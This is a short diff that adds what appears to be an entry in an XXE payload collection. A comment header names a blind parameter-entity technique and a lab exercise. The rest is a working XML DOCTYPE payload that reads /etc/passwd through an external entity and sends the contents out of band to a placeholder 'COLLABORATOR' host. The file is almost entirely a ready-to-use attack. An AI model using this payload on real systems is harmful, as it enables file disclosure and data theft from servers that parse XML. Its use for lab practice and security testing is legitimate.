@@ -1,0 +1,12 @@
+<!--
+Payload: Blind Parameter Entity + External DTD Chain
+Usage: Data exfiltration via OOB
+Lab: Blind XXE to exfiltrate data via external DTD
+Note: The external DTD should contain the logic to extract the data and send it.
+-->
+<!DOCTYPE foo [
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://COLLABORATOR/?x=%file;'>">
+  %eval;
+  %exfiltrate;
+]>
